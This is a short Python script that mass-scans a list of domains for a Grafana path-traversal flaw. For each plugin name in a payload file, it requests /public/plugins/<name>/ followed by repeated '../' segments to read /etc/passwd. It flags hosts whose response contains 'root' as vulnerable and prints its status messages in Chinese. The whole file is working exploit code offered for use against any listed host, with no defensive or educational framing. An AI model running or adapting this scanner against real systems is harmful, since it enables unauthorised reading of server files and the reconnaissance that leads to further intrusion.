# -*- coding: utf-8 -*-
# @Time : 2021/12/9 16:08
# @Author : culprit
# @File : grafana_hole.py
# @Software: PyCharm

import requests
headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
    }
payloads = open('payload.txt','r',encoding='utf-8').readlines()
domains = open('doamin.txt','r',encoding='utf-8').readlines()
print("---------------------------------------------------------------------------------------------------------------------------")
for domain in domains:
    print(domain.strip())
    for payload in payloads:
        url = "http://" + domain.strip() + "/public/plugins/" + payload.strip()+ "/../../../../../../../../../../../etc/passwd"
        req = requests.post(url, headers=headers, timeout=(3, 7))
        if req.status_code == 200:
            str1 = 'root'
            if str1 in req.text:
                print('存在漏洞：url: ' + url)
        else:
            print('模板' + payload.strip() + '不存在漏洞')
    print("---------------------------------------------------------------------------------------------------------------------------")